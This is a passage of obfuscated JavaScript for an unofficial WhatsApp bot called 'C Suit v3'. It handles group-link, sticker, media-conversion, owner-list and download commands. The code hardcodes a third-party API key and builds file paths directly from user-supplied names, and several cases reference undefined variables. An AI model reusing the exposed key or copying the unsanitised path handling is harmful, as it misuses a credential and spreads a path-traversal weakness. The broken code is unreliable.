          await _0x239047.groupSettingUpdate(_0x5f530e.chat, "unlocked").then(_0x2710e2 => _0x4242ca("Successfully Opened Group Edit Info 🕊️"))["catch"](_0x1decb0 => _0x4242ca(json(_0x1decb0)));
        } else if (_0x4376c7[0x0] === "close") {
          await _0x239047.groupSettingUpdate(_0x5f530e.chat, "locked").then(_0x47ad20 => _0x4242ca("Successfully Closed Group Edit Info🕊️"))["catch"](_0x1d561b => _0x4242ca(json(_0x1d561b)));
        } else {
          _0x4242ca("Mode " + _0x418bf4 + "\n\n\nType " + (_0x1e0f65 + _0x418bf4) + "on/off");
        }
        break;
      case 'linkgroup':
      case "grouplink":
      case 'linkgrup':
      case 'linkgc':
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        let _0x32d974 = await _0x239047.groupInviteCode(_0x5f530e.chat);
        _0x239047.sendText(_0x5f530e.chat, "👥 *GROUP LINK INFO*\n📛 *Name :* " + _0x190b37.subject + "\n👤 *Group Owner :* " + (_0x190b37.owner !== undefined ? '@' + _0x190b37.owner.split`@`[0x0] : "Not known") + "\n🌱 *ID :* " + _0x190b37.id + "\n🔗 *Chat Link :* https://chat.whatsapp.com/" + _0x32d974 + "\n👥 *Member :* " + _0x190b37.participants.length + "\n", _0x5f530e, {
          'detectLink': true
        });
        break;
      case 'revoke':
      case "resetlink":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (!_0x299dec && !_0x318139 && !_0x11eb7e) {
          return _0x4242ca(mess.admin);
        }
        if (!_0x4f407d) {
          return _0x4242ca(mess.botAdmin);
        }
        await _0x239047.groupRevokeInvite(_0x5f530e.chat).then(_0x26cd98 => {
          _0x4242ca("Successful Reset, Group Invite Link " + _0x190b37.subject);
        })['catch'](_0x367a14 => _0x4242ca(json(_0x367a14)));
        break;
      case 'p':
      case "ping":
        {
          await _0x740dec();
          const _0x5c5235 = new Date();
          const _0x5d13ea = await _0x239047.sendMessage(_0x5f530e.chat, {
            'text': "🔄 *CSUIT* 🔄\n\n🕒 *Checking Speed...*"
          });
          setTimeout(async () => {
            await _0x239047.relayMessage(_0x5f530e.chat, {
              'protocolMessage': {
                'key': _0x5d13ea.key,
                'type': 0xe,
                'editedMessage': {
                  'conversation': ("\n━━━━━━━━━━━━━━━━━━━━━\n⚡ *CSUIT SPEED* ⚡\n📶 *Response Time:* \n" + (new Date() - _0x5c5235) + " 𝙼𝚂\n━━━━━━━━━━━━━━━━━━━━━\n🚀 *Optimized for Speed!*\n\n> C SUIT\n          ").trim()
                }
              }
            }, {});
          }, 0x3e8);
        }
        break;
      case "buypremium":
      case "buyprem":
      case "premium":
        {
          let _0x3763be = "Hi " + _0x19720f + "👋\nWant to Buy Premium? Just chat with the owner😉";
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'text': _0x3763be,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': '' + botname,
                'body': '' + ownername,
                'thumbnailUrl': 'https://files.catbox.moe/l1srou.jpg',
                'sourceUrl': global.link,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "runtime":
        let _0x172c0c = "Bots Have Been Running For " + runtime(process.uptime());
        _0x239047.sendMessage(_0x5f530e.chat, {
          'text': _0x172c0c,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': '' + botname,
              'body': "FORGET DONATE",
              'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0x5f530e
        });
        break;
      case 'sc':
      case "script":
      case 'scriptbot':
        _0x239047.sendMessage(_0x5f530e.chat, {
          'text': "🫂https://github.com/LOSTBOY1-TCH/C_Suit_v3",
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'title': '' + botname,
              'body': "SCRIPT OF " + botname + " ASK LOST BOY OR LORD TECH",
              'thumbnailUrl': "https://files.catbox.moe/l1srou.jpg",
              'sourceUrl': global.link,
              'mediaType': 0x1,
              'renderLargerThumbnail': true
            }
          }
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "donate":
      case 'donasi':
        let _0x2ddcd4 = "Hello Brother " + _0x19720f + "\n\nNo matter how much you donate is very valuable for us";
        _0x239047.sendMessage(_0x5f530e.chat, {
          'text': "233549551004 momo\n\n" + _0x2ddcd4
        }, {
          'quoted': _0x5f530e
        });
        break;
      case "owner":
        {
          const _0x2d7c41 = await _0x239047.sendMessage(_0x39554b, {
            'contacts': {
              'displayName': _0x323bca.length + " Contact",
              'contacts': _0x323bca
            },
            'mentions': [_0x1b540f]
          }, {
            'quoted': _0x5f530e
          });
          _0x239047.sendMessage(_0x39554b, {
            'text': "Hi @" + _0x1b540f.split('@')[0x0] + ", Here is my handsome owner😇",
            'mentions': [_0x1b540f]
          }, {
            'quoted': _0x2d7c41
          });
        }
        break;
      case 'sticker':
      case "stiker":
      case 's':
        {
          if (!_0x50ec5a) {
            return _0x4242ca("Reply to Video/Image With Caption " + (_0x1e0f65 + _0x418bf4));
          }
          if (/image/.test(_0x49e192)) {
            let _0x1241fa = await _0x50ec5a.download();
            let _0x49c348 = await _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x1241fa, _0x5f530e, {
              'packname': packname,
              'author': author
            });
            await fs.unlinkSync(_0x49c348);
          } else {
            if (_0x38cba4 || /video/.test(_0x49e192)) {
              if ((_0x50ec5a.msg || _0x50ec5a).seconds > 0xb) {
                return _0x4242ca("Maximum 10 seconds!");
              }
              let _0x128641 = await _0x50ec5a.download();
              let _0x488cdb = await _0x239047.sendVideoAsSticker(_0x5f530e.chat, _0x128641, _0x5f530e, {
                'packname': packname,
                'author': author
              });
              await fs.unlinkSync(_0x488cdb);
            } else {
              return _0x4242ca("Send Images/Videos With Captions " + (_0x1e0f65 + _0x418bf4) + "\nVideo Duration 1-9 Seconds");
            }
          }
        }
        break;
      case "smeme":
        {
          let _0x4b8663 = "Send/Reply image/sticker with caption " + (_0x1e0f65 + _0x418bf4) + " text1|text2";
          if (!/image/.test(_0x49e192)) {
            return _0x4242ca(_0x4b8663);
          }
          if (!_0x208b05) {
            return _0x4242ca(_0x4b8663);
          }
          _0x4242ca(mess.wait);
          atas = _0x208b05.split('|')[0x0] ? _0x208b05.split('|')[0x0] : '-';
          bawah = _0x208b05.split('|')[0x1] ? _0x208b05.split('|')[0x1] : '-';
          let _0x42b493 = await _0x239047.downloadAndSaveMediaMessage(_0x31f71a);
          let _0x1960e0 = await TelegraPh(_0x42b493);
          let _0x51a1b7 = "https://api.memegen.link/images/custom/" + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x1960e0;
          let _0x35faa5 = await _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x51a1b7, _0x5f530e, {
            'packname': packname,
            'author': author
          });
          fs.unlinkSync(_0x35faa5);
        }
        break;
      case "swm":
      case "steal":
      case 'stickerwm':
      case "xmenu_ohe":
        {
          if (!_0x4376c7.join(" ")) {
            return _0x4242ca("Where is the text?");
          }
          if (_0x5f530e.quoted.isAnimated === true) {
            _0x239047.downloadAndSaveMediaMessage(_0x50ec5a, "gifee");
            _0x239047.sendMessage(_0x39554b, {
              'sticker': fs.readFileSync('gifee.webp')
            }, {
              'quoted': _0x5f530e
            });
          } else {
            if (/image/.test(_0x49e192)) {} else {
              if (/video/.test(_0x49e192)) {
                if ((_0x50ec5a.msg || _0x50ec5a).seconds > 0xb) {
                  return _0x4242ca("Maximum 10 Seconds!");
                }
              } else {
                _0x4242ca("Photo/Video?");
              }
            }
          }
        }
        break;
      case 'toimage':
      case "toimg":
        {
          if (!/webp/.test(_0x49e192)) {
            return _0x4242ca("Reply sticker with caption *" + (_0x1e0f65 + _0x418bf4) + '*');
          }
          _0x4242ca(mess.wait);
          let _0x53ed04 = await _0x239047.downloadAndSaveMediaMessage(_0x31f71a);
          let _0x1f9fa2 = await getRandom(".png");
          exec("ffmpeg -i " + _0x53ed04 + " " + _0x1f9fa2, _0x124bef => {
            fs.unlinkSync(_0x53ed04);
            if (_0x124bef) {
              return _0x124bef;
            }
            let _0xed1ea7 = fs.readFileSync(_0x1f9fa2);
            _0x239047.sendMessage(_0x5f530e.chat, {
              'image': _0xed1ea7
            }, {
              'quoted': _0x5f530e
            });
            fs.unlinkSync(_0x1f9fa2);
          });
        }
        break;
      case 'tomp4':
      case "tovideo":
        {
          if (!/webp/.test(_0x49e192)) {
            return _0x4242ca("Reply sticker with caption *" + (_0x1e0f65 + _0x418bf4) + '*');
          }
          _0x4242ca(mess.wait);
          let _0x10fc14 = await _0x239047.downloadAndSaveMediaMessage(_0x31f71a);
          let _0xe634b0 = await webp2mp4File(_0x10fc14);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'video': {
              'url': _0xe634b0.result,
              'caption': "Convert Webp To Video"
            }
          }, {
            'quoted': _0x5f530e
          });
          await fs.unlinkSync(_0x10fc14);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(_0x49e192) && !/audio/.test(_0x49e192)) {
            return _0x4242ca("Send/Reply Video/Audio that you want to make into audio with caption " + (_0x1e0f65 + _0x418bf4));
          }
          _0x4242ca(mess.wait);
          let _0x45fb2e = await _0x239047.downloadMediaMessage(_0x31f71a);
          let _0xcb0215 = await toAudio(_0x45fb2e, "mp4");
          _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': _0xcb0215,
            'mimetype': 'audio/mpeg'
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "tomp3":
        {
          if (!/video/.test(_0x49e192) && !/audio/.test(_0x49e192)) {
            return _0x4242ca("Send/Reply Video/Audio that you want to make into MP3 with caption " + (_0x1e0f65 + _0x418bf4));
          }
          _0x4242ca(mess.wait);
          let _0x443ce4 = await _0x239047.downloadMediaMessage(_0x31f71a);
          let _0x39d6b1 = await toAudio(_0x443ce4, "mp4");
          _0x239047.sendMessage(_0x5f530e.chat, {
            'document': _0x39d6b1,
            'mimetype': "audio/mp3",
            'fileName': '11.mp3'
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case 'tovn':
      case 'toptt':
        {
          if (!/video/.test(_0x49e192) && !/audio/.test(_0x49e192)) {
            return _0x4242ca("Reply Video/Audio that you want to make into a VN with caption " + (_0x1e0f65 + _0x418bf4));
          }
          _0x4242ca(mess.wait);
          let _0x4dceae = await _0x239047.downloadMediaMessage(_0x31f71a);
          let {
            toPTT: _0x3fcd9d
          } = require("./lib/converter");
          let _0x12136e = await _0x3fcd9d(_0x4dceae, 'mp4');
          _0x239047.sendMessage(_0x5f530e.chat, {
            'audio': _0x12136e,
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x5f530e
          });
        }
        break;
      case "togif":
        {
          if (!/webp/.test(_0x49e192)) {
            return _0x4242ca("Reply sticker with caption *" + (_0x1e0f65 + _0x418bf4) + '*');
          }
          _0x4242ca(mess.wait);
          let _0x3d496f = await _0x239047.downloadAndSaveMediaMessage(_0x31f71a);
          let _0x549684 = await webp2mp4File(_0x3d496f);
          await _0x239047.sendMessage(_0x5f530e.chat, {
            'video': {
              'url': _0x549684.result,
              'caption': "Convert Webp To Video"
            },
            'gifPlayback': true
          }, {
            'quoted': _0x5f530e
          });
          await fs.unlinkSync(_0x3d496f);
        }
        break;
      case "emojimix":
        {
          let [_0x3e214e, _0xb2a5ec] = _0x208b05.split`+`;
          if (!_0x3e214e) {
            return _0x4242ca("Example : " + (_0x1e0f65 + _0x418bf4) + " 😅+🤔");
          }
          if (!_0xb2a5ec) {
            return _0x4242ca("Example : " + (_0x1e0f65 + _0x418bf4) + " 😅+🤔");
          }
          _0x4242ca(mess.wait);
          let _0x4bfe4f = await fetchJson('https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=' + encodeURIComponent(_0x3e214e) + '_' + encodeURIComponent(_0xb2a5ec));
          for (let _0x5a8923 of _0x4bfe4f.results) {
            let _0x39a9dc = await _0x239047.sendImageAsSticker(_0x5f530e.chat, _0x5a8923.url, _0x5f530e, {
              'packname': global.packname,
              'author': global.author,
              'categories': _0x5a8923.tags
            });
            await fs.unlinkSync(_0x39a9dc);
          }
        }
        break;
      case "toonce":
      case 'toviewonce':
        {
          if (!_0x50ec5a) {
            return _0x4242ca("Reply Image/Video");
          }
          if (/image/.test(_0x49e192)) {
            xmenu_ohan = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
            _0x239047.sendMessage(_0x5f530e.chat, {
              'image': {
                'url': xmenu_ohan
              },
              'caption': "Here you go!",
              'fileLength': "999",
              'viewOnce': true
            }, {
              'quoted': _0x5f530e
            });
          } else if (/video/.test(_0x49e192)) {
            xmenu_ohxmenu_ohan = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
            _0x239047.sendMessage(_0x5f530e.chat, {
              'video': {
                'url': xmenu_ohxmenu_ohan
              },
              'caption': "Here you go!",
              'fileLength': "99999999",
              'viewOnce': true
            }, {
              'quoted': _0x5f530e
            });
          }
        }
        break;
      case "toqr":
        {
          if (!q) {
            return _0x4242ca(" Please include link or text!");
          }
          const _0x16af14 = require("qrcode");
          let _0x3c77f8 = await _0x16af14.toDataURL(q, {
            'scale': 0x23
          });
          let _0x10dc17 = new Buffer.from(_0x3c77f8.replace('data:image/png;base64,', ''), "base64");
          let _0x255d68 = getRandom(".jpg");
          await fs.writeFileSync('./' + _0x255d68, _0x10dc17);
          let _0x2af2d0 = fs.readFileSync('./' + _0x255d68);
          await _0x239047.sendMessage(_0x39554b, {
            'image': _0x2af2d0,
            'caption': "Here you go!"
          }, {
            'quoted': _0x5f530e
          });
          setTimeout(() => {
            fs.unlinkSync(_0x255d68);
          }, 0x2710);
        }
        break;
      case "fliptext":
        {
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Example:\n" + _0x1e0f65 + "fliptext Xeony");
          }
          quere = _0x4376c7.join(" ");
          flipe = quere.split('').reverse().join('');
          _0x4242ca("```「 FLIP TEXT 」```\n*•> Normal :*\n" + quere + "\n*•> Flip :*\n" + flipe);
        }
        break;
      case "listvn":
        {
          let _0x188fc7 = "┌──⭓「 *List Vn* 」\n│\n";
          for (let _0x32c156 of VoiceNoteXeon) {
            _0x188fc7 += "│⭔ " + _0x32c156 + "\n";
          }
          _0x188fc7 += "│\n└────────────⭓\n\n*Total : " + VoiceNoteXeon.length + '*';
          _0x4242ca(_0x188fc7);
        }
        break;
      case "liststicker":
        {
          let _0x32e708 = "┌──⭓「 *List Sticker* 」\n│\n";
          for (let _0x25841d of StickerXeon) {
            _0x32e708 += "│⭔ " + _0x25841d + "\n";
          }
          _0x32e708 += "│\n└────────────⭓\n\n*Total : " + StickerXeon.length + '*';
          _0x4242ca(_0x32e708);
        }
        break;
      case "listimage":
        {
          let _0x44185e = "┌──⭓「 *List Image* 」\n│\n";
          for (let _0x998cf2 of ImageCsuit) {
            _0x44185e += "│⭔ " + _0x998cf2 + "\n";
          }
          _0x44185e += "│\n└────────────⭓\n\n*Total : " + ImageCsuit.length + '*';
          _0x4242ca(_0x44185e);
        }
        break;
      case 'listvideo':
        {
          let _0x50e242 = "┌──⭓「 *List Video* 」\n│\n";
          for (let _0x2816f5 of VideoXeon) {
            _0x50e242 += "│⭔ " + _0x2816f5 + "\n";
          }
          _0x50e242 += "│\n└────────────⭓\n\n*Total : " + VideoXeon.length + '*';
          _0x4242ca(_0x50e242);
        }
        break;
      case 'addowner':
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (!_0x4376c7[0x0]) {
          return _0x4242ca("Use " + (_0x1e0f65 + _0x418bf4) + " number\nExample " + (_0x1e0f65 + _0x418bf4) + " " + ownernumber);
        }
        bnnd = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x20cb7d = await _0x239047.onWhatsApp(bnnd);
        if (_0x20cb7d.length == 0x0) {
          return _0x4242ca("Enter A Valid And Registered Number On WhatsApp!!!");
        }
        owner.push(bnnd);
        fs.writeFileSync("./dtbs/owner.json", JSON.stringify(owner));
        _0x4242ca("Number " + bnnd + " Has Become An Owner!!!");
        break;
      case "delowner":
        if (!_0x11eb7e) {
          return _0x4242ca(mess.owner);
        }
        if (!_0x4376c7[0x0]) {
          return _0x4242ca("Use " + (_0x1e0f65 + _0x418bf4) + " nomor\nExample " + (_0x1e0f65 + _0x418bf4) + " 923444844060");
        }
        ya = q.split('|')[0x0].replace(/[^0-9]/g, '');
        unp = owner.indexOf(ya);
        owner.splice(unp, 0x1);
        fs.writeFileSync("./dtbs/owner.json", JSON.stringify(owner));
        _0x4242ca("The Numbrr " + ya + " Has been deleted from owner list by the owner!!!");
        break;
      case 'addvideo':
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Video Name?");
          }
          if (VideoXeon.includes(q)) {
            return _0x4242ca("The name you entered already exists");
          }
          let _0x4f301e = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
          VideoXeon.push(q);
          await fsx.copy(_0x4f301e, "./C-SMedia/video/" + q + '.mp4');
          fs.writeFileSync('./dtbs/autoreply/video.json', JSON.stringify(VideoXeon));
          fs.unlinkSync(_0x4f301e);
          _0x4242ca("Success Adding VideoTo View Type " + _0x1e0f65 + 'listvideo');
        }
        break;
      case "delvideo":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the Video Name");
          }
          if (!VideoXeon.includes(q)) {
            return _0x4242ca("Name Does Not Exist");
          }
          let _0x127e74 = VideoXeon.indexOf(q);
          VideoXeon.splice(_0x127e74, 0x1);
          fs.writeFileSync("./dtbs/autoreply/video.json", JSON.stringify(VideoXeon));
          fs.unlinkSync("./C-SMedia/video/" + q + ".mp4");
          _0x4242ca("Successfully Deleted Video " + q);
        }
        break;
      case 'addimage':
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("The name of the image?");
          }
          if (ImageCsuit.includes(q)) {
            return _0x4242ca("The name you entered is already registered in the database");
          }
          let _0x3d29dc = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
          ImageCsuit.push(q);
          await fsx.copy(_0x3d29dc, "./C-SMedia/image/" + q + ".jpg");
          fs.writeFileSync("./dtbs/autoreply/image.json", JSON.stringify(ImageCsuit));
          fs.unlinkSync(_0x3d29dc);
          _0x4242ca("Success In Adding Image\nTo Check Type " + _0x1e0f65 + "listimage");
        }
        break;
      case "delimage":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the Image Name");
          }
          if (!ImageCsuit.includes(q)) {
            return _0x4242ca("The image name you entered is not registered");
          }
          let _0x452e6b = ImageCsuit.indexOf(q);
          ImageCsuit.splice(_0x452e6b, 0x1);
          fs.writeFileSync("./dtbs/autoreply/image.json", JSON.stringify(ImageCsuit));
          fs.unlinkSync("./C-SMedia/image/" + q + ".jpg");
          _0x4242ca("Successfully Deleted Image " + q);
        }
        break;
      case "addsticker":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the name of the sticker?");
          }
          if (StickerXeon.includes(q)) {
            return _0x4242ca("Name Already In Use");
          }
          let _0x5e1b28 = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
          StickerXeon.push(q);
          await fsx.copy(_0x5e1b28, "./C-SMedia/sticker/" + q + ".webp");
          fs.writeFileSync("./dtbs/autoreply/sticker.json", JSON.stringify(StickerXeon));
          fs.unlinkSync(_0x5e1b28);
          _0x4242ca("Successfully Adding StickerTo Check Type " + _0x1e0f65 + "liststicker");
        }
        break;
      case "delsticker":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the name of the sticker");
          }
          if (!StickerXeon.includes(q)) {
            return _0x4242ca("Name Not Registered in Database");
          }
          let _0x23ea7a = StickerXeon.indexOf(q);
          StickerLostBoyTechInc.splice(_0x23ea7a, 0x1);
          fs.writeFileSync('./dtbs/autoreply/sticker.json', JSON.stringify(StickerXeon));
          fs.unlinkSync("./C-SMedia/sticker/" + q + '.webp');
          _0x4242ca("Successfully Removed Sticker " + q);
        }
        break;
      case "addvn":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the Name?");
          }
          if (VoiceNoteXeon.includes(q)) {
            return _0x4242ca("Name Already In Use");
          }
          let _0x2fb554 = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
          VoiceNoteXeon.push(q);
          await fsx.copy(_0x2fb554, "./C-SMedia/audio/" + q + '.mp3');
          fs.writeFileSync('./dtbs/autoreply/vn.json', JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync(_0x2fb554);
          _0x4242ca("Success Adding Audio\nTo Check Type " + _0x1e0f65 + "listvn");
        }
        break;
      case "delvn":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the Name");
          }
          if (!VoiceNoteXeon.includes(q)) {
            return _0x4242ca("Name Not Registered in Database");
          }
          let _0x1c9177 = VoiceNoteXeon.indexOf(q);
          VoiceNoteXeon.splice(_0x1c9177, 0x1);
          fs.writeFileSync("./dtbs/autoreply/vn.json", JSON.stringify(VoiceNoteXeon));
          fs.unlinkSync('./C-SMedia/audio/' + q + ".mp3");
          _0x4242ca("Successfully Deleted Audio " + q);
        }
        break;
      case "addzip":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("What's the zip name?");
          }
          let _0x1ea3a3 = '' + _0x208b05;
          {
            if (ZipXeon.includes(_0x1ea3a3)) {
              return _0x4242ca("This name is already in use");
            }
            let _0x4734ea = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
            ZipXeon.push(_0x1ea3a3);
            await fsx.copy(_0x4734ea, './C-SMedia/zip/' + _0x1ea3a3 + ".zip");
            fs.writeFileSync("./dtbs/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync(_0x4734ea);
            _0x4242ca("Success Adding zip\nTo check type " + _0x1e0f65 + 'listzip');
          }
        }
        break;
      case "delzip":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the text in the zip list");
          }
          let _0x20a2e0 = '' + _0x208b05;
          {
            if (!ZipXeon.includes(_0x20a2e0)) {
              return _0x4242ca("This name does not exist in the database");
            }
            let _0x3380bf = ZipXeon.indexOf(_0x20a2e0);
            ZipXeon.splice(_0x3380bf, 0x1);
            fs.writeFileSync("./dtbs/autoreply/zip.json", JSON.stringify(ZipXeon));
            fs.unlinkSync("./C-SMedia/zip/" + _0x20a2e0 + ".zip");
            _0x4242ca("Successfully deleted zip " + _0x20a2e0);
          }
        }
        break;
      case "listzip":
        {
          await _0x740dec();
          let _0x46da56 = "┌──⭓「 *ZIP LIST* 」\n│\n";
          for (let _0x172b6f of ZipXeon) {
            _0x46da56 += "│⭔ " + _0x172b6f + "\n";
          }
          _0x46da56 += "│\n└────────────⭓\n\n*Total : " + ZipXeon.length + '*';
          _0x4242ca(_0x46da56);
        }
        break;
      case 'addapk':
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("What is the name of the apk?");
          }
          let _0x48ba02 = '' + _0x208b05;
          {
            if (ApkXeon.includes(_0x48ba02)) {
              return _0x4242ca("This name is already in use");
            }
            let _0x17873c = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
            apknye.push(_0x48ba02);
            await fsx.copy(_0x17873c, "./C-SMedia/apk/" + _0x48ba02 + ".apk");
            fs.writeFileSync("./dtbs/autoreply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync(_0x17873c);
            _0x4242ca("Successful Adding apk\nTo Check type " + _0x1e0f65 + "listapk");
          }
        }
        break;
      case 'delapk':
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Name of the apk?");
          }
          let _0x16e422 = '' + _0x208b05;
          {
            if (!ApkXeon.includes(_0x16e422)) {
              return _0x4242ca("This name does not exist in the database");
            }
            let _0x1c9bab = ApkXeon.indexOf(_0x16e422);
            ApkXeon.splice(_0x1c9bab, 0x1);
            fs.writeFileSync("./dtbs/autoreply/apk.json", JSON.stringify(ApkXeon));
            fs.unlinkSync("./C-SMedia/apk/" + _0x16e422 + ".apk");
            _0x4242ca("Successfully deleted Apk " + _0x16e422);
          }
        }
        break;
      case "listapk":
        {
          await _0x740dec();
          let _0x59b09c = "┌──⭓「 *APK LIST* 」\n│\n";
          for (let _0x25bc91 of ApkXeon) {
            _0x59b09c += "│⭔ " + _0x25bc91 + "\n";
          }
          _0x59b09c += "│\n└────────────⭓\n\n*Total : " + ApkXeon.length;
          _0x4242ca(_0x59b09c);
        }
        break;
      case "addpdf":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("What is the name of the pdf");
          }
          let _0x4e189d = '' + _0x208b05;
          {
            if (DocXeon.includes(_0x4e189d)) {
              return _0x4242ca("This name is already in use");
            }
            let _0x2d1468 = await _0x239047.downloadAndSaveMediaMessage(_0x50ec5a);
            docunye.push(_0x4e189d);
            await fsx.copy(_0x2d1468, "./C-SMedia/doc/" + _0x4e189d + ".pdf");
            fs.writeFileSync("./dtbs/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync(_0x2d1468);
            _0x4242ca("Successful Adding Pdf\nTo check type " + _0x1e0f65 + "listpdf");
          }
        }
        break;
      case "delpdf":
        {
          if (!_0x2fc88e) {
            return _0x4242ca(mess.prem);
          }
          await _0x740dec();
          if (_0x4376c7.length < 0x1) {
            return _0x4242ca("Enter the name");
          }
          let _0x103afc = '' + _0x208b05;
          {
            if (!DocXeon.includes(_0x103afc)) {
              return _0x4242ca("This name does not exist in the database");
            }
            let _0x43d327 = DocApk.indexOf(_0x103afc);
            docunye.splice(_0x43d327, 0x1);
            fs.writeFileSync("./dtbs/autoreply/doc.json", JSON.stringify(DocXeon));
            fs.unlinkSync("./C-SMedia/doc/" + _0x103afc + '.pdf');
            _0x4242ca("Successfully deleted pdf " + _0x103afc);
          }
        }
        break;
      case "listpdf":
        {
          await _0x740dec();
          let _0x100c55 = "┌──⭓「 *PDF LIST* 」\n│\n";
          for (let _0x1c4419 of docunye) {
            _0x100c55 += "│⭔ " + _0x1c4419 + "\n";
          }
          _0x100c55 += "│\n└────────────⭓\n\n*Total : " + docunye.length + '*';
          _0x4242ca(_0x100c55);
        }
        break;
      case "afk":
        if (!_0x5f530e.isGroup) {
          return _0x4242ca(mess.group);
        }
        if (_0x283a4e) {
          return _0x4242ca("Already afk");
        }
        let _0x30e69c = _0x208b05 ? _0x208b05 : "Nothing.";
        afk.addAfkUser(_0x5f530e.sender, Date.now(), _0x30e69c, _afk);
        _0x4242ca('@' + _0x5f530e.sender.split('@')[0x0] + " Currently AFK\nWith reason : " + _0x30e69c);
        break;
      case "video":
      case "ytmp4":
        {
          if (!_0x208b05) {
            return _0x4242ca("*Example*: " + (_0x1e0f65 + _0x418bf4) + " band4band by central cee");
          }
          try {
            await _0x239047.sendMessage(_0x5f530e.chat, {
              'react': {
                'text': "📽️",
                'key': _0x5f530e?.["key"]
              }
            });
            const _0xaf8993 = require("yt-search");
            let _0x3955f7 = await _0xaf8993(_0x208b05);
            let _0x511624 = _0x3955f7.all[0x0];
            let _0x19b91c = "*CSUIT V3_VIDEO - PLAYER*\n" + ("> Title: *" + _0x511624.title + "*\n") + ("> Views: *" + _0x511624.views + "*\n") + ("> Duration: *" + _0x511624.timestamp + "*\n") + ("> Uploaded: *" + _0x511624.ago + "*\n") + ("> Url: *" + _0x511624.url + '*');
            await _0x239047.sendMessage(_0x5f530e.chat, {
              'image': {
                'url': _0x511624.thumbnail
              },
              'caption': _0x19b91c
            }, {
              'quoted': _0x5f530e
            });
            const _0xb97d2a = await axios.get("https://api.davidcyriltech.my.id/download/ytmp4", {
              'params': {
                'url': _0x511624.url
              }
            });
            if (_0xb97d2a.data.success) {
              const {
                title: _0x47f151,
                download_url: _0x206743
              } = _0xb97d2a.data.result;
              await _0x239047.sendMessage(_0x5f530e.chat, {
                'video': {
                  'url': _0x206743
                },
                'mimetype': "video/mp4",
                'caption': "🎬 *Title:* " + _0x47f151 + "\n\n> POWERED BY C SUIT"
              }, {
                'quoted': _0x5f530e
              });
            } else {
              _0x4242ca("*Error fetching the video! Please try again later.*");
            }
          } catch (_0x164780) {
            console.error("Error during video command:", _0x164780);
            _0x4242ca("*An error occurred while processing your request.*");
          }
          break;
        }
      case "stickhighfive":
        {
          axios.get("https://api.waifu.pics/sfw/highfive").then(({
